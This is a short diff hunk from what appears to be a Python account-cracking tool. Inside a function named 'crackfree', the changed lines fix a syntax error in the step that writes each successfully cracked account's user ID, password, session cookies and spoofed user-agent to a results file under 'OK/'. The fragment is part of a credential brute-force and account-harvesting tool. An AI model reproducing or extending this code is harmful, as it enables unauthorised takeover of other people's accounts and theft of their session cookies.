@@ -828,7 +828,7 @@ def crackfree(idf,pwv):
 				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 6.0.1; ASUS_Z00ED Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 YaBrowser/17.6.1.345.00 Mobile Safari/537.36"}
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				open('OK/'+okc,'a').write('╰──>'idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
+				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
 				user=idf
 				infoakun = ""
 				session = requests.Session()
